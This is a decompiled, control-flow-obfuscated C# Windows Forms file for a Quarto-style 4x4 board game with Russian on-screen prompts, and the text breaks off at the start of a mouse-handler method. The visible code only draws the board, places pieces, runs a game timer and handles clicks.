using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = 907836333;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x3C6E2E1Eu) % 4u)
					{
					case 3u:
						num = (int)((num2 * 1884724748) ^ 0x6289AFBC);
						continue;
					case 2u:
						Dark = copy.Dark;
						Big = copy.Big;
						Square = copy.Square;
						num = ((int)num2 * -909220948) ^ -1324033137;
						continue;
					case 0u:
						break;
					default:
						Point = copy.Point;
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_0317: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Expected O, but got Unknown
		int num4 = default(int);
		int num5 = default(int);
		double num8 = default(double);
		bool flag = default(bool);
		while (true)
		{
			int num = -341077054;
			while (true)
			{
				uint num2;
				double num3;
				PictureBox[,] array;
				int num9;
				int num10;
				PictureBox obj;
				switch ((num2 = (uint)num ^ 0xF05CDE2Bu) % 24u)
				{
				case 23u:
					num4 = 0;
					num = ((int)num2 * -2120276415) ^ 0x340281A0;
					continue;
				case 22u:
					num5 = 0;
					num = -1894622814;
					continue;
				case 21u:
					num = (int)(num2 * 1457424445) ^ -630561464;
					continue;
				case 20u:
					num = ((int)num2 * -1948879999) ^ -1345919104;
					continue;
				case 19u:
					if (num5 >= 2)
					{
						num = -943025021;
						continue;
					}
					num3 = 0.0;
					goto IL_0083;
				case 18u:
					num5++;
					num = (int)((num2 * 908766610) ^ 0x57E22ED7);
					continue;
				case 17u:
					InitializeComponent();
					num = ((int)num2 * -1969339384) ^ -265390897;
					continue;
				case 16u:
				{
					int num13;
					if (num5 >= 4)
					{
						num = -2118695824;
						num13 = -2118695824;
					}
					else
					{
						num = -1129714680;
						num13 = -1129714680;
					}
					continue;
				}
				case 15u:
					borderBox = new PictureBox[4, 4];
					num = (int)((num2 * 1475158087) ^ 0x5894620D);
					continue;
				case 14u:
					Form1.smethod_11((Control)(object)menu);
					num = (int)(num2 * 1542613473) ^ -1970788988;
					continue;
				case 13u:
					num = ((int)num2 * -239387040) ^ 0x40C62CC6;
					continue;
				case 12u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = ((int)num2 * -1101241354) ^ 0x6FA92BF5;
					continue;
				}
				case 11u:
					num4++;
					num = ((int)num2 * -1978215427) ^ -159617336;
					continue;
				case 9u:
					num = ((int)num2 * -1504954274) ^ 0x3AFD490D;
					continue;
				case 8u:
				{
					PictureBox[,] array2 = borderBox;
					int num11 = num4;
					int num12 = num5;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)num5 + num8) * (double)size), 1 + num4 * size));
					Form1.smethod_7((Control)(object)obj2, bool_0: false);
					array2[num11, num12] = obj2;
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num4, num5]);
					num = (int)((num2 * 1181627903) ^ 0x4794CAD0);
					continue;
				}
				case 7u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = ((int)num2 * -296133051) ^ -94060882;
					continue;
				case 6u:
					pictureBox = new PictureBox[4, 4];
					num = ((int)num2 * -789577998) ^ 0x5A328ED0;
					continue;
				case 5u:
				{
					int num6;
					int num7;
					if (!flag)
					{
						num6 = 1816673578;
						num7 = 1816673578;
					}
					else
					{
						num6 = 1830111640;
						num7 = 1830111640;
					}
					num = num6 ^ (int)(num2 * 1705662801);
					continue;
				}
				case 4u:
					flag = num4 < 4;
					num = -502793210;
					continue;
				case 3u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num4, num5]);
					num = (int)(num2 * 1298178220) ^ -836578510;
					continue;
				case 2u:
					Form1.smethod_6((Control)(object)pictureBox[num4, num5], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = (int)((num2 * 1267359502) ^ 0x3AFB0897);
					continue;
				case 0u:
					num3 = 4.1;
					goto IL_0083;
				default:
					return;
				case 10u:
					break;
				case 1u:
					return;
					IL_0083:
					num8 = num3;
					array = pictureBox;
					num9 = num4;
					num10 = num5;
					obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)num5 + num8) * (double)size), 4 + num4 * size));
					Form1.smethod_5((Control)(object)obj, Color.White);
					array[num9, num10] = obj;
					num = -466086543;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = 917663273;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3E215EB2u) % 3u)
				{
				case 1u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_000d:
				num = ((int)num2 * -2092892747) ^ -1479441989;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		bool flag = default(bool);
		while (true)
		{
			int num = 1640036594;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x188AE889u) % 8u)
				{
				case 5u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -468813156;
						num4 = -468813156;
					}
					else
					{
						num3 = -1354168063;
						num4 = -1354168063;
					}
					num = num3 ^ (int)(num2 * 1589345869);
					continue;
				}
				case 4u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -653390560) ^ -1985401626;
					continue;
				case 3u:
					num = ((int)num2 * -1314930277) ^ -105160712;
					continue;
				case 2u:
					num = ((int)num2 * -1278770364) ^ 0x63659E49;
					continue;
				case 1u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 425733659;
					continue;
				}
				case 0u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 1844083644;
					continue;
				default:
					return;
				case 6u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		int num5 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = 1685719732;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x605BC229u) % 15u)
				{
				case 14u:
					num5 = 0;
					num = 1245949106;
					continue;
				case 13u:
					Paint_Board();
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 475091643) ^ 0x2C53E290);
					continue;
				case 12u:
					Form1.smethod_5((Control)(object)borderBox[num3, num5], Color.White);
					num = (int)(num2 * 1564396214) ^ -376593436;
					continue;
				case 11u:
					num = 888163797;
					continue;
				case 10u:
					num = ((int)num2 * -931245679) ^ -413805264;
					continue;
				case 8u:
					num5++;
					num = (int)((num2 * 1426975581) ^ 0x5F5A39B7);
					continue;
				case 7u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num5], bool_0: false);
					num = (int)(num2 * 245295963) ^ -612091318;
					continue;
				case 5u:
					storage[num3, num5] = new Figurine(num3 < 2, num5 % 2 == 0, num5 < 2, num3 % 2 == 1);
					num = ((int)num2 * -858617120) ^ 0x4806382F;
					continue;
				case 4u:
					storage = new Figurine[4, 4];
					num3 = 0;
					num = ((int)num2 * -894429244) ^ 0x4C7F60C4;
					continue;
				case 3u:
					num3++;
					num = (int)((num2 * 1189479349) ^ 0x1942D027);
					continue;
				case 2u:
					Paint_Storage();
					num = ((int)num2 * -1199075494) ^ -27720999;
					continue;
				case 1u:
				{
					int num6;
					if (num5 >= 4)
					{
						num = 57129714;
						num6 = 57129714;
					}
					else
					{
						num = 1618779138;
						num6 = 1618779138;
					}
					continue;
				}
				case 0u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = 1216546414;
						num4 = 1216546414;
					}
					else
					{
						num = 310032996;
						num4 = 310032996;
					}
					continue;
				}
				case 6u:
					break;
				default:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
		int num8 = default(int);
		int num7 = default(int);
		float num6 = default(float);
		float num5 = default(float);
		bool point = default(bool);
		bool flag2 = default(bool);
		Graphics graphics_ = default(Graphics);
		float num4 = default(float);
		bool big = default(bool);
		bool flag3 = default(bool);
		Brush brush_ = default(Brush);
		bool flag = default(bool);
		float num9 = default(float);
		float num3 = default(float);
		while (true)
		{
			int num = 1638016536;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x77052283u) % 43u)
				{
				case 42u:
				{
					int num22;
					int num23;
					if (board[num8, num7].Dark)
					{
						num22 = 1719598753;
						num23 = 1719598753;
					}
					else
					{
						num22 = 1017081100;
						num23 = 1017081100;
					}
					num = num22 ^ ((int)num2 * -1182277013);
					continue;
				}
				case 41u:
					num6 = num5 * 0.4f / (float)Form1.smethod_27(2.0);
					point = board[num8, num7].Point;
					num = ((int)num2 * -261138116) ^ -495157049;
					continue;
				case 40u:
					flag2 = board[num8, num7] != null;
					num = (int)(num2 * 2082330460) ^ -1128514682;
					continue;
				case 39u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num7 + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1515057889) ^ 0x71913E39;
					continue;
				case 38u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num4 + (float)(num7 * size), num4 + (float)(num8 * size), num6, num6);
					num = (int)((num2 * 585567107) ^ 0x686614BE);
					continue;
				case 37u:
					num = ((int)num2 * -1670869914) ^ -444589697;
					continue;
				case 36u:
				{
					int num18;
					int num19;
					if (big)
					{
						num18 = -753836138;
						num19 = -753836138;
					}
					else
					{
						num18 = -153357912;
						num19 = -153357912;
					}
					num = num18 ^ (int)(num2 * 1685297541);
					continue;
				}
				case 35u:
					num = (int)(num2 * 1191669716) ^ -472757691;
					continue;
				case 34u:
					num = ((int)num2 * -1290508829) ^ -2017962295;
					continue;
				case 33u:
					num = (int)((num2 * 573850670) ^ 0x50595ABE);
					continue;
				case 32u:
				{
					int num12;
					int num13;
					if (flag2)
					{
						num12 = 28590556;
						num13 = 28590556;
					}
					else
					{
						num12 = 392275217;
						num13 = 392275217;
					}
					num = num12 ^ ((int)num2 * -1006813548);
					continue;
				}
				case 31u:
					num = (int)(num2 * 842451496) ^ -333306373;
					continue;
				case 30u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 592755514) ^ -1941468311;
					continue;
				case 29u:
					num7++;
					num = ((int)num2 * -1757303166) ^ -1757771815;
					continue;
				case 28u:
				{
					int num20;
					int num21;
					if (flag3)
					{
						num20 = -1480095262;
						num21 = -1480095262;
					}
					else
					{
						num20 = -787077514;
						num21 = -787077514;
					}
					num = num20 ^ (int)(num2 * 1061011301);
					continue;
				}
				case 27u:
					num7 = 0;
					num = 1649583045;
					continue;
				case 26u:
					brush_ = Form1.smethod_26();
					num = 1523583515;
					continue;
				case 25u:
					Form1.smethod_28(graphics_, brush_, num4 + (float)(num7 * size), num4 + (float)(num8 * size), num6, num6);
					num = (int)((num2 * 101658142) ^ 0x3B784D3A);
					continue;
				case 24u:
					num8++;
					num = (int)((num2 * 865045633) ^ 0x3351F881);
					continue;
				case 23u:
					num = (int)(num2 * 1958246719) ^ -1642494762;
					continue;
				case 22u:
					flag = num8 < 4;
					num = 891741370;
					continue;
				case 21u:
					brush_ = Form1.smethod_25();
					num = (int)(num2 * 769729315) ^ -698042510;
					continue;
				case 20u:
				{
					int num16;
					int num17;
					if (!point)
					{
						num16 = 1816398206;
						num17 = 1816398206;
					}
					else
					{
						num16 = 1738545923;
						num17 = 1738545923;
					}
					num = num16 ^ (int)(num2 * 1619333836);
					continue;
				}
				case 19u:
					num9 = 1f;
					num = ((int)num2 * -1067028103) ^ -2123416801;
					continue;
				case 18u:
					num = ((int)num2 * -1939054541) ^ -1455281211;
					continue;
				case 17u:
					num = 737318590;
					continue;
				case 16u:
					num9 = 0.7f;
					num = 235664301;
					continue;
				case 15u:
					num = 1669827269;
					continue;
				case 13u:
					num8 = 0;
					num = (int)((num2 * 1263842602) ^ 0x27451558);
					continue;
				case 12u:
					num = ((int)num2 * -1233186812) ^ 0x1FA4BD61;
					continue;
				case 11u:
					num3 = 1f - num9 * 0.4f / (float)Form1.smethod_27(2.0);
					num4 = (float)size * (num3 / 2f);
					num = 1772708126;
					continue;
				case 10u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 125715491) ^ 0x7640B2B8);
					continue;
				case 9u:
					flag3 = num7 < 4;
					num = 1290931539;
					continue;
				case 8u:
					num = 1373112369;
					continue;
				case 7u:
				{
					int num14;
					int num15;
					if (board[num8, num7].Square)
					{
						num14 = -241707298;
						num15 = -241707298;
					}
					else
					{
						num14 = -1045431855;
						num15 = -1045431855;
					}
					num = num14 ^ ((int)num2 * -30826183);
					continue;
				}
				case 6u:
					num3 = 1f - num9 * 0.9f / (float)Form1.smethod_27(2.0);
					num = 335477520;
					continue;
				case 5u:
					big = board[num8, num7].Big;
					num = 163940583;
					continue;
				case 4u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = 1938265140;
						num11 = 1938265140;
					}
					else
					{
						num10 = 430981757;
						num11 = 430981757;
					}
					num = num10 ^ ((int)num2 * -1991574805);
					continue;
				}
				case 3u:
					num5 = (float)size * num9;
					num = ((int)num2 * -1355912324) ^ -236390796;
					continue;
				case 1u:
					Form1.smethod_24(graphics_, brush_, num4 + (float)(num7 * size), num4 + (float)(num8 * size), num6, num6);
					num = 1858982656;
					continue;
				case 0u:
					num4 = (float)size * (num3 / 2f);
					num6 = num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 1650811939) ^ 0x43056924);
					continue;
				default:
					return;
				case 14u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		bool flag = default(bool);
		int num5 = default(int);
		int num6 = default(int);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num7 = default(float);
		float num8 = default(float);
		float num11 = default(float);
		float num12 = default(float);
		bool flag2 = default(bool);
		bool point = default(bool);
		float num13 = default(float);
		bool dark = default(bool);
		bool big = default(bool);
		while (true)
		{
			int num = -62277365;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD54480A8u) % 43u)
				{
				case 42u:
					num = (int)(num2 * 2051804584) ^ -560824739;
					continue;
				case 41u:
					num = (int)((num2 * 1237851204) ^ 0x43C4B1BC);
					continue;
				case 40u:
					num = ((int)num2 * -1938085560) ^ -329915480;
					continue;
				case 39u:
					flag = storage[num5, num6] != null;
					num = -1977931543;
					continue;
				case 38u:
					Form1.smethod_24(graphics_, brush_, num7, num7, num8, num8);
					num = -237088014;
					continue;
				case 37u:
				{
					int num19;
					int num20;
					if (!flag)
					{
						num19 = -687111582;
						num20 = -687111582;
					}
					else
					{
						num19 = -526037142;
						num20 = -526037142;
					}
					num = num19 ^ (int)(num2 * 1329966637);
					continue;
				}
				case 36u:
					Form1.smethod_20(pictureBox[num5, num6], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num5, num6]), Form1.smethod_16((Control)(object)pictureBox[num5, num6])));
					num = (int)(num2 * 1644667132) ^ -428604058;
					continue;
				case 35u:
					num6 = 0;
					num = -659758978;
					continue;
				case 34u:
					num = ((int)num2 * -106395076) ^ -587364185;
					continue;
				case 32u:
					num11 = 1f - num12 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -800089693;
					continue;
				case 31u:
					num5 = 0;
					num = (int)((num2 * 853748328) ^ 0x58543947);
					continue;
				case 29u:
					flag2 = num6 < 4;
					num = -192327534;
					continue;
				case 28u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = -290608059;
					continue;
				case 27u:
					point = storage[num5, num6].Point;
					num = (int)((num2 * 955977465) ^ 0x2B58CBC5);
					continue;
				case 26u:
				{
					int num21;
					int num22;
					if (flag2)
					{
						num21 = -89328028;
						num22 = -89328028;
					}
					else
					{
						num21 = -299333781;
						num22 = -299333781;
					}
					num = num21 ^ (int)(num2 * 2127903649);
					continue;
				}
				case 25u:
				{
					int num17;
					int num18;
					if (num6 >= 2)
					{
						num17 = -1204450402;
						num18 = -1204450402;
					}
					else
					{
						num17 = -1208201401;
						num18 = -1208201401;
					}
					num = num17 ^ (int)(num2 * 1763319310);
					continue;
				}
				case 24u:
					num = (int)(num2 * 1204690384) ^ -1475883329;
					continue;
				case 23u:
					Form1.smethod_28(graphics_, brush_, num7, num7, num8, num8);
					num = (int)((num2 * 764752372) ^ 0x5064CA8A);
					continue;
				case 22u:
					num11 = 1f - num12 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -1017548164;
					continue;
				case 21u:
					num = ((int)num2 * -1661717530) ^ 0x556AF879;
					continue;
				case 20u:
					num5++;
					num = (int)((num2 * 1334025114) ^ 0x591A8535);
					continue;
				case 19u:
					num8 = num13 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -690974182) ^ 0x2B683AE1;
					continue;
				case 18u:
					num12 = 1f;
					num = ((int)num2 * -1658600705) ^ -433291608;
					continue;
				case 17u:
					num = ((int)num2 * -1364553182) ^ 0x512DA3E8;
					continue;
				case 16u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num7, num7, num8, num8);
					num = (int)((num2 * 137152219) ^ 0x76B6D603);
					continue;
				case 15u:
					num8 = num13 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -747857499) ^ -769349390;
					continue;
				case 14u:
					num12 = 0.7f;
					num = -918376337;
					continue;
				case 13u:
				{
					int num15;
					int num16;
					if (!dark)
					{
						num15 = 1678467922;
						num16 = 1678467922;
					}
					else
					{
						num15 = 1746970761;
						num16 = 1746970761;
					}
					num = num15 ^ (int)(num2 * 1024288831);
					continue;
				}
				case 12u:
					num7 = (float)size * (num11 / 2f) - 4f;
					num = ((int)num2 * -1231507241) ^ -382270282;
					continue;
				case 11u:
					big = storage[num5, num6].Big;
					num = -1384859457;
					continue;
				case 10u:
					brush_ = Form1.smethod_26();
					num = -1725868419;
					continue;
				case 9u:
				{
					int num14;
					if (num5 < 4)
					{
						num = -581655742;
						num14 = -581655742;
					}
					else
					{
						num = -88892967;
						num14 = -88892967;
					}
					continue;
				}
				case 8u:
					num13 = (float)size * num12;
					num = (int)(num2 * 987762599) ^ -1582013126;
					continue;
				case 7u:
					num = (int)((num2 * 287014856) ^ 0x745F07F6);
					continue;
				case 6u:
					num6++;
					num = -659758978;
					continue;
				case 5u:
					num7 = (float)size * (num11 / 2f) - 4f;
					num = ((int)num2 * -818721278) ^ 0x72977576;
					continue;
				case 4u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num5, num6]));
					dark = storage[num5, num6].Dark;
					num = (int)((num2 * 1300323148) ^ 0x280DE81F);
					continue;
				case 3u:
				{
					int num9;
					int num10;
					if (big)
					{
						num9 = -527754768;
						num10 = -527754768;
					}
					else
					{
						num9 = -1290294749;
						num10 = -1290294749;
					}
					num = num9 ^ (int)(num2 * 506278433);
					continue;
				}
				case 2u:
				{
					int num3;
					int num4;
					if (!point)
					{
						num3 = 1978982609;
						num4 = 1978982609;
					}
					else
					{
						num3 = 2056744729;
						num4 = 2056744729;
					}
					num = num3 ^ ((int)num2 * -1823101755);
					continue;
				}
				case 1u:
					num = (int)((num2 * 646234103) ^ 0x29D4CDCA);
					continue;
				case 0u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -1896703867) ^ 0x6412F314;
					continue;
				default:
					return;
				case 33u:
					break;
				case 30u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		int num4 = default(int);
		int num3 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		int num9 = default(int);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1574578842;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x68BC69B8u) % 29u)
				{
				case 28u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = (int)((num2 * 2086200511) ^ 0x1902621F);
					continue;
				case 27u:
					num = ((int)num2 * -74366237) ^ -1848027151;
					continue;
				case 26u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 1932068499) ^ 0x68E82A26);
					continue;
				case 25u:
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -572361301) ^ -1572803841;
					continue;
				case 24u:
					num4++;
					num = ((int)num2 * -1181581069) ^ 0x46349F60;
					continue;
				case 23u:
					num4 = 0;
					num = 1948813843;
					continue;
				case 22u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					step = 0;
					num = ((int)num2 * -2044375337) ^ -1832582785;
					continue;
				case 21u:
					num3++;
					num = ((int)num2 * -590774717) ^ 0x546B84D2;
					continue;
				case 20u:
					num = (int)(num2 * 1591915861) ^ -1041205284;
					continue;
				case 19u:
					flag3 = num4 < 4;
					num = 1658989715;
					continue;
				case 17u:
					flag = turn;
					num = ((int)num2 * -580533392) ^ -909230244;
					continue;
				case 16u:
					Form1.smethod_36(timer1);
					num = ((int)num2 * -305530513) ^ 0x69F55414;
					continue;
				case 15u:
				{
					int num11;
					int num12;
					if (!flag3)
					{
						num11 = -1138045069;
						num12 = -1138045069;
					}
					else
					{
						num11 = -1691582594;
						num12 = -1691582594;
					}
					num = num11 ^ ((int)num2 * -864821024);
					continue;
				}
				case 14u:
					num = (int)(num2 * 1093862197) ^ -1790820696;
					continue;
				case 13u:
					step = 1;
					num = (int)(num2 * 1527665519) ^ -1366443830;
					continue;
				case 12u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 570564031;
					continue;
				case 11u:
				{
					int num10 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num9, num10], Color.Blue);
					num = ((int)num2 * -991440096) ^ -1559899650;
					continue;
				}
				case 10u:
					flag2 = num3 < 4;
					num = 613895302;
					continue;
				case 9u:
					num = 46788304;
					continue;
				case 8u:
					num9 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1500424910) ^ -1990473414;
					continue;
				case 7u:
				{
					int num7;
					int num8;
					if (flag2)
					{
						num7 = 1135162823;
						num8 = 1135162823;
					}
					else
					{
						num7 = 1814587716;
						num8 = 1814587716;
					}
					num = num7 ^ ((int)num2 * -228861146);
					continue;
				}
				case 5u:
					num = ((int)num2 * -942260371) ^ -1449641109;
					continue;
				case 4u:
					num3 = 0;
					num = ((int)num2 * -109842209) ^ 0x4EE8DB58;
					continue;
				case 3u:
					num = ((int)num2 * -376511337) ^ -241644855;
					continue;
				case 2u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = ((int)num2 * -2137542503) ^ -1694077717;
					continue;
				case 1u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -1483882516;
						num6 = -1483882516;
					}
					else
					{
						num5 = -158991872;
						num6 = -158991872;
					}
					num = num5 ^ (int)(num2 * 296922364);
					continue;
				}
				case 0u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num = 78992098;
					continue;
				default:
					return;
				case 6u:
					break;
				case 18u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		while (true)
		{
			int num = 1717725921;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x392E919Cu) % 3u)
				{
				case 1u:
					goto IL_001c;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_001c:
				Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
				num = ((int)num2 * -975433643) ^ -1616658988;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Expected O, but got Unknown
		int num9 = default(int);
		int num6 = default(int);
		Point point = default(Point);
		int num13 = default(int);
		int num5 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		while (true)
		{
			int num = 995255377;
			while (true)
			{
				uint num2;
				int num10;
				switch ((num2 = (uint)num ^ 0x2E0C3CA9u) % 29u)
				{
				case 28u:
					if (storage[num9, num6] != null)
					{
						num = 2083863949;
						continue;
					}
					num10 = 0;
					goto IL_0020;
				case 27u:
					num6 -= 4;
					num = (int)(num2 * 1303923595) ^ -1744308438;
					continue;
				case 26u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)((num2 * 1136299198) ^ 0x18AF6C0F);
					continue;
				case 25u:
					num = ((int)num2 * -1432235930) ^ 0x43B2B3B2;
					continue;
				case 24u:
					Form1.smethod_5((Control)(object)borderBox[num13, num5], Color.White);
					num = 1004540165;
					continue;
				case 23u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -356810444) ^ -1517773277;
					continue;
				case 22u:
					num10 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num9, num6]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_0020;
				case 21u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)(num2 * 443189399) ^ -2014695050;
					continue;
				case 20u:
					num6 = point.X / size;
					flag2 = num6 > 1;
					num = (int)((num2 * 55891029) ^ 0xD1743AC);
					continue;
				case 19u:
					num5 = 0;
					num = 1638980689;
					continue;
				case 16u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 1162489251) ^ -388069818;
					continue;
				case 15u:
					num = (int)((num2 * 831069205) ^ 0x723DD075);
					continue;
				case 14u:
					flag = num5 < 4;
					num = 1902860031;
					continue;
				case 13u:
					num13 = 0;
					num = ((int)num2 * -539753074) ^ 0x301417F0;
					continue;
				case 12u:
					flag3 = num13 < 4;
					num = 1137046949;
					continue;
				case 11u:
					num9 = point.Y / size;
					num = (int)((num2 * 2093621952) ^ 0x431F3ED0);
					continue;
				case 10u:
					num = (int)(num2 * 1748806229) ^ -958062510;
					continue;
				case 9u:
					num = (int)(num2 * 1176809612) ^ -1949773269;
					continue;
				case 8u:
					num13++;
					num = ((int)num2 * -1133984006) ^ -609299938;
					continue;
				case 7u:
				{
					int num14;
					int num15;
					if (flag4)
					{
						num14 = -1679671372;
						num15 = -1679671372;
					}
					else
					{
						num14 = -2084972779;
						num15 = -2084972779;
					}
					num = num14 ^ ((int)num2 * -513121752);
					continue;
				}
				case 6u:
				{
					int num11;
					int num12;
					if (flag3)
					{
						num11 = -1243978260;
						num12 = -1243978260;
					}
					else
					{
						num11 = -1389670922;
						num12 = -1389670922;
					}
					num = num11 ^ ((int)num2 * -695789247);
					continue;
				}
				case 5u:
					num = (int)((num2 * 649027207) ^ 0x5DA3219C);
					continue;
				case 4u:
					Form1.smethod_5((Control)(object)borderBox[num9, num6], Color.Red);
					num = (int)((num2 * 1406581716) ^ 0x49F6220A);
					continue;
				case 3u:
					num5++;
					num = ((int)num2 * -1924727590) ^ 0xACE829;
					continue;
				case 2u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = 748919587;
						num8 = 748919587;
					}
					else
					{
						num7 = 969651170;
						num8 = 969651170;
					}
					num = num7 ^ ((int)num2 * -256887570);
					continue;
				}
				case 1u:
					num = ((int)num2 * -1145954704) ^ 0x1AABAC36;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 691302195;
						num4 = 691302195;
					}
					else
					{
						num3 = 445135191;
						num4 = 445135191;
					}
					num = num3 ^ ((int)num2 * -1218272675);
					continue;
				}
				default:
					return;
				case 17u:
					break;
				case 18u:
					return;
					IL_0020:
					flag4 = (byte)num10 != 0;
					num = 938368817;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
